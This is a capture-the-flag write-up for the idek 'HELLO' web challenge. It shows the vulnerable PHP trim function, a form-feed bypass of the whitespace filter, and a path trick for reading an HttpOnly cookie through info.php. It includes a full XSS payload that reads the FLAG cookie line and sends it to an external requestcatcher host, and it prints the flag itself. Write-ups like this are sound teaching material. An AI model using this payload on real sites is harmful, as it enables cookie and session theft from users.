# HELLO (Web Exploitation)

### Challenge Description:

This challenge involves exploiting a web application with a vulnerable PHP script and a Node.js bot that sets an HttpOnly cookie. The goal is to exfiltrate the flag from this cookie by exploiting the XSS vulnerability.

### Challenge Code Analysis:

```php
<?php
function Enhanced_Trim($inp) {
  $trimmed = array("\r", "\n", "\t", "/", " ");
  return str_replace($trimmed, "", $inp);
}

if(isset($_GET['name'])) {
  $name = substr($_GET['name'], 0, 23);
  echo "Hello, ".Enhanced_Trim($_GET['name']);
}
?>
```

Takes a name parameter, applies the Enhanced_Trim function to it, and then outputs it.

bot.js:
It sets an HttpOnly cookie named FLAG and navigates to a target URL to trigger the XSS payload.

### Approach:

- The `index.php` script allows input via the `name` parameter, which is passed through `Enhanced_Trim`. This function does not strip out all characters, allowing us to inject HTML and JavaScript payloads.

- We need to bypass the restriction on whitespace characters. By using the form feed character (%0c), we can construct a payload that executes JavaScript.

```
<svg%0conload=alert(123)>
```

- Using `info.php`, cookies can be displayed and accessed via a path traversal bypass `/info.php/index.php`.

### Payload:

```
<svg%0conload=fetch(window.location.href.substring(0, 7) + "idek-hello.chal.idek.team:1337" + window.location.href.substring(5,6) + "info.php" + window.location.href.substring(5,6) + "index.php").then(function(response){response.text().then(function(txt){txt.split(`\n`).forEach(function(line){if(line.indexOf("FLAG")!=-1){fetch(window.location.href.substring(0, 7) + "mishajain123.requestcatcher.com" + window.location.href.substring(5,6) + "cookies?resp=" + line)}})})})>
```

- `window.location.href.substring(0, 7)` : Gives `http://`.
- `window.location.href.substring(5, 6)` : Gives `/`
- `.forEach(function(line){if(line.indexOf("FLAG")!=-1){...}})` : If FLAG in text, performs another fetch request to send text to requestcatcher.

### Flag:
`idek{Ghazy_N3gm_Elbalad}`